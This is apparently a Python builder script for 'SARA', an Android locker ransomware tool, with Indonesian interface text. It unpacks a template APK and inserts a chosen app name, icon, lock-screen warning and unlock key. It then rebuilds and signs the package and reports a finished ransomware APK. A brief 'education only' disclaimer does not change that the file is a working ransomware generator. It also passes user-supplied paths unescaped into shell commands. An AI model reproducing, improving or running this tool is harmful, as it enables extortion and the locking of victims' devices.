#! /usr/bin/env python3
import os, sys, time, fileinput
from getpass import getpass
from PIL import Image
import shutil

# Color codes for terminal output
r = "\033[1;31m"   # Red
g = "\033[1;32m"   # Green
y = "\033[1;33m"   # Yellow
b = "\033[1;34m"   # Blue
p = "\033[1;35m"   # Purple
c = "\033[1;36m"   # Cyan
w = "\033[1;37m"   # White
d = "\033[2;37m"   # Dark (dim white)

# Background colors
R = "\033[1;41m"   # Red background
G = "\033[1;42m"   # Green background
Y = "\033[1;43m"   # Yellow background
B = "\033[1;44m"   # Blue background
P = "\033[1;45m"   # Purple background
C = "\033[1;46m"   # Cyan background
W = "\033[1;47m"   # White background

# Reset color
reset = "\033[0m"

# Global variables
app_icon = ""
app_name = ""
alert_title = ""
alert_desc = ""
key_pass = ""

def banner():
    """Display a stylish banner for the application"""
    # Get terminal width
    term_width = shutil.get_terminal_size().columns
    
    # Enhanced ASCII art
    ascii_art = f"""
{p}    ███████╗ █████╗ ██████╗  █████╗ {reset}
{p}    ██╔════╝██╔══██╗██╔══██╗██╔══██╗{reset}
{r}    ███████╗███████║██████╔╝███████║{reset}
{r}    ╚════██║██╔══██║██╔══██╗██╔══██║{reset}
{g}    ███████║██║  ██║██║  ██║██║  ██║{reset}
{g}    ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝{reset}
    """
    
    # Create centered header
    header = f"{p}⚡ Serangan Ransomware Android Sederhana v2.0 ⚡{reset}"
    header = header.center(term_width)
    
    # Create footer line
    footer = f"{c}─" * (term_width-2)
    
    # Print banner
    print(ascii_art)
    print(header)
    print(footer)
    
    # Print application details in a stylish format
    details = [
        f"{c}[{w}Pembuat{c}]{reset}  : {g}ADE PRATAMA{reset}",
        f"{c}[{w}Versi{c}]{reset}   : {g}2.0 BETA{reset}",
        f"{c}[{w}GitHub{c}]{reset}   : {g}https://github.com/HolyBytes{reset}"
    ]
    
    for detail in details:
        print(detail)
    
    print(footer)

def show_progress(message, duration=0.05):
    """Display a loading progress animation"""
    animation = ["[⣾]", "[⣽]", "[⣻]", "[⢿]", "[⡿]", "[⣟]", "[⣯]", "[⣷]"]
    for i in range(20):
        time.sleep(duration)
        sys.stdout.write(f"\r{g}" + animation[i % len(animation)] + f" {message}{reset}")
        sys.stdout.flush()
    print()

def writefile(file, old, new):
    """Replace text in a file"""
    if os.path.isfile(file):
        show_progress(f"Memperbarui {os.path.basename(file)}")
        replaces = {old: new}
        for line in fileinput.input(file, inplace=True):
            for search in replaces:
                replaced = replaces[search]
                line = line.replace(search, replaced)
            print(line, end="")
        return True
    else:
        print(f"\n{r}[✗]{reset} Gagal menulis ke file {file}")
        return False

def get_input(prompt, input_type="text"):
    """Get and validate user input"""
    while True:
        user_input = input(f"{c}[{w}?{c}]{reset} {prompt}: {g}")
        print(reset, end="")
        
        if input_type == "file":
            if os.path.isfile(user_input):
                if user_input.lower().endswith(".png"):
                    return user_input
                else:
                    print(f"{r}[✗]{reset} File tidak diterima, hanya format PNG yang diperbolehkan!")
            else:
                print(f"{r}[✗]{reset} File tidak ditemukan, silakan masukkan path yang valid!")
        else:  # text input
            if user_input.strip():
                return user_input
            else:
                print(f"{r}[✗]{reset} Input tidak boleh kosong, silakan coba lagi!")

def start():
    """Main function to start the application"""
    global app_icon, app_name, alert_title, alert_desc, key_pass
    
    # Clear screen
    os.system("cls" if os.name == "nt" else "clear")
    
    # Display banner
    banner()
    
    # Disclaimer
    print(f"\n{y}[!]{reset} {r}PERINGATAN:{reset}")
    print(f"{w}Aplikasi ini hanya untuk tujuan pendidikan. Penyalahgunaan dilarang keras.{reset}")
    
    # Get agreement
    agreement = input(f"{y}[!]{reset} Apakah Anda setuju menggunakan aplikasi ini hanya untuk tujuan pendidikan? (y/n): ").lower()
    if agreement != "y" and agreement != "yes":
        print(f"\n{r}[✗]{reset} Anda harus menyetujui persyaratan untuk melanjutkan. Keluar...")
        sys.exit(1)
    
    # Get current location and time
    location = os.popen("curl ifconfig.co/city --silent").readline().strip()
    country = os.popen("curl ifconfig.co/country --silent").readline().strip()
    current_time = time.strftime("%d/%m/%Y (%H:%M:%S)")
    
    # Display information message
    print(f"\n{p}╔{'═' * 60}╗{reset}")
    print(f"{p}║{reset} {c}SARA{reset} - {g}Simple Android Ransomware Attack{reset}")
    print(f"{p}║{reset} Kostumisasi Ikon Aplikasi, Nama, Pesan Peringatan dan Kunci Buka.")
    print(f"{p}║{reset} {d}Catatan: Jika lupa kunci, restart perangkat yang terinfeksi.{reset}")
    print(f"{p}╠{'═' * 60}╣{reset}")
    print(f"{p}║{reset} {b}Lokasi:{reset} {location}, {country}")
    print(f"{p}║{reset} {b}Waktu:{reset} {current_time}")
    print(f"{p}║{reset} {y}Tip:{reset} Gunakan \\n untuk baris baru dan CTRL+C untuk keluar")
    print(f"{p}╚{'═' * 60}╝{reset}")
    
    # Get user inputs
    print(f"\n{c}{'─' * 30} KONFIGURASI {'─' * 30}{reset}\n")
    
    app_icon = get_input("Atur ikon aplikasi (hanya PNG)", "file")
    app_name = get_input("Atur nama aplikasi")
    alert_title = get_input("Atur judul peringatan")
    alert_desc = get_input("Atur isi pesan peringatan")
    key_pass = get_input("Atur kunci pembuka")
    
    # Building process
    print(f"\n{b}{'─' * 30} PROSES PEMBUATAN {'─' * 29}{reset}\n")
    
    print(f"{g}[✓]{reset} Memulai pembuatan APK ransomware Anda...")
    os.system("apktool d sara.apk")
    
    # Define image paths
    imgpath = [
        "sara/res/drawable-mdpi-v4/ic_launcher.png",
        "sara/res/drawable-xhdpi-v4/ic_launcher.png",
        "sara/res/drawable-hdpi-v4/ic_launcher.png",
        "sara/res/drawable-xxhdpi-v4/ic_launcher.png",
    ]
    
    # Define strings file
    strings = "sara/res/values/strings.xml"
    print(f"{g}[✓]{reset} Menggunakan file strings: {strings}")
    
    # Find smali file
    smali = os.popen("find -L sara/ -name '*0000.smali'", "r").readline().strip()
    print(f"{g}[✓]{reset} Menggunakan file smali: {os.path.basename(smali)}")
    
    # Update files
    if not writefile(strings, "appname", app_name):
        sys.exit(1)
    print(f"{g}[✓]{reset} Menambahkan nama aplikasi: {y}{app_name}{reset}")
    
    if not writefile(strings, "alert_title", alert_title):
        sys.exit(1)
    print(f"{g}[✓]{reset} Menambahkan judul peringatan: {y}{alert_title}{reset}")
    
    if not writefile(strings, "alert_desc", alert_desc):
        sys.exit(1)
    print(f"{g}[✓]{reset} Menambahkan isi pesan peringatan ({len(alert_desc)} karakter)")
    
    if not writefile(smali, "key_pass", key_pass):
        sys.exit(1)
    print(f"{g}[✓]{reset} Menambahkan kunci pembuka: {y}{key_pass}{reset}")
    
    # Process icons
    for path in imgpath:
        if os.path.isfile(path):
            with Image.open(path) as target:
                width, height = target.size
                size = f"{width}x{height}"
                logo = os.path.basename(app_icon)
                os.system(f"cp -R {app_icon} {logo}")
                os.system(f"mogrify -resize {size} {logo};cp -R {logo} {path}")
                os.system(f"rm -rf {logo}")
                print(f"{g}[✓]{reset} Menambahkan ikon: {y}{os.path.basename(app_icon)}{reset} (Ukuran: {size})")
        else:
            print(f"{r}[✗]{reset} Path ikon tidak ditemukan: {path}")
            sys.exit(1)
    
    # Build and sign APK
    print(f"\n{b}{'─' * 30} PENYELESAIAN APK {'─' * 31}{reset}\n")
    
    show_progress("Membangun APK", 0.1)
    os.system("apktool b sara -o final.apk > /dev/null 2>&1")
    print(f"{g}[✓]{reset} APK berhasil dibuat")
    
    show_progress("Membersihkan file sementara", 0.1)
    os.system("rm -rf sara")
    print(f"{g}[✓]{reset} File sementara dibersihkan")
    
    show_progress("Menandatangani APK", 0.1)
    os.system("java -jar ubersigner.jar -a final.apk --ks debug.jks --ksAlias debugging --ksPass debugging --ksKeyPass debugging > /dev/null 2>&1")
    print(f"{g}[✓]{reset} APK berhasil ditandatangani")
    
    show_progress("Verifikasi APK", 0.1)
    os.system("java -jar ubersigner.jar -a final.apk --onlyVerify > /dev/null 2>&1")
    os.system("rm -rf final.apk")
    
    # Generate final output
    out = app_name.replace(" ", "").lower() + ".apk"
    if os.path.isfile("final-aligned-signed.apk"):
        os.system(f"mv final-aligned-signed.apk {out}")
        
        # Show completion message with fancy formatting
        print(f"\n{g}╔{'═' * 60}╗{reset}")
        print(f"{g}║{reset} {y}✓ BERHASIL: {reset}APK ransomware Anda telah berhasil dibuat! {g}║{reset}")
        print(f"{g}╠{'═' * 60}╣{reset}")
        print(f"{g}║{reset} {b}File output:{reset} {out}{' ' * (48 - len(out))}{g}║{reset}")
        print(f"{g}╚{'═' * 60}╝{reset}")
        
        # Wait for user input
        getpass(f"\n{b}[i]{reset} Tekan ENTER untuk keluar...")
    else:
        print(f"\n{r}[✗]{reset} Gagal menandatangani APK")
        sys.exit(1)

if __name__ == "__main__":
    try:
        start()
    except KeyboardInterrupt:
        print(f"\n\n{y}[!]{reset} Proses dihentikan oleh pengguna")
        print(f"{b}[i]{reset} Terima kasih telah menggunakan SARA!")
        print(f"{b}[i]{reset} Ikuti kami di: {g}https://github.com/termuxhackers-id{reset}")
        sys.exit(0)